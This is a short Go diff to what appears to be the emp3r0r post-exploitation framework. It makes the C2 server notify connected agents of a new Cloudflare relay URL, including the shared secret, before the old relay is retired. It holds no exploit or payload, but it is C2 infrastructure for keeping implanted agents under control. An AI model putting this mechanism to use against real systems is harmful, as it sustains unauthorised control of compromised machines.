@@ -10,6 +10,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 )
 
@@ -155,10 +156,23 @@ func MigrateRelayTo(targetID, reason string) error {
 	}
 	logging.Warningf("cf migrate: %s healthy, new relay %s", target.Label, relayBase)
 
+	// Notify LIVE agents over their existing sockets FIRST: the MIGRATE_URL
+	// redeploy below only reaches new DO instances, so agents connected to
+	// running instances would hang on a connection whose CC peer is gone.
+	// A text control frame through the still-live DO reaches them directly.
+	migrateURL := relayBase + "/ws/" + cfDefaultRoomA + "?role=agent&secret=" + url.QueryEscape(cfg.SharedSecret)
+	for _, oldURL := range live.RuntimeConfig.RelayURLs {
+		nctx, ncancel := context.WithTimeout(context.Background(), 30*time.Second)
+		if err := transport.NotifyRelayMigration(nctx, oldURL, migrateURL); err != nil {
+			logging.Warningf("cf migrate: failed to notify live agents on %s: %v",
+				relayHostOf(oldURL), err)
+		}
+		ncancel()
+	}
+
 	// Point the old worker at the new deployment: existing agents get
 	// close(4002, newURL), new connections get 409.
 	if active != nil {
-		migrateURL := relayBase + "/ws/" + cfDefaultRoomA + "?role=agent&secret=" + url.QueryEscape(cfg.SharedSecret)
 		if err := pointWorkerAtMigration(active, cfg.WorkerName, cfg.SharedSecret, migrateURL); err != nil {
 			logging.Warningf("cf migrate: failed to repoint old worker %s with MIGRATE_URL: %v", active.ID, err)
 			// fallback: drop the old zone route so the old domain fails and
